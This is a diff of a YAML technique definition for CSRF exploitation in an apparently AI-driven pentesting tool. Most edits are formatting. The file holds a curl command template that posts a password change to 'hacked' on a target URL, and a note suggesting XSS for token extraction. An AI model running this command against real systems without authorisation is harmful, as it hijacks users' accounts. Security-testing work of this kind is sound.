@@ -2,15 +2,17 @@ name: csrf
 category: web
 description: Cross-Site Request Forgery exploitation
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s '{target_url}' -d 'action=change_password&new_password=hacked'"
+command_template: curl -s '{target_url}' -d 'action=change_password&new_password=hacked'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Force authenticated user to perform action. Requires: no CSRF token, no SameSite cookie, predictable request format. Combine with XSS for token extraction."
+mechanism: 'Force authenticated user to perform action. Requires: no CSRF token, no
+  SameSite cookie, predictable request format. Combine with XSS for token extraction.'
+hacktricks_ref: pentesting-web/hacking-with-cookies/README.md
